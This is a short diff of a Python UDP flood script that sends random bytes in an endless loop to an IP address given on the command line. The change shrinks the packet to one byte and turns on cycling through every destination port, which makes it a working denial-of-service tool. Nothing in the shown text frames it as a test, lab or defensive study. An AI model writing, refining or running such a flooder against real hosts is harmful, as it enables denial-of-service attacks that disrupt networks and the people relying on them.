@@ -2,7 +2,7 @@ import socket
 import random
 import sys
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(8)
+bytes = random._urandom(1)
 try:
     ip = sys.argv[1]
 except:
@@ -10,6 +10,6 @@ except:
 port = 53
 while True:
     sock.sendto(bytes, (ip, port))
-    # port += 1
-    # if port == 65534:
-    #     port = 1
+    port += 1
+    if port == 65534:
+        port = 1
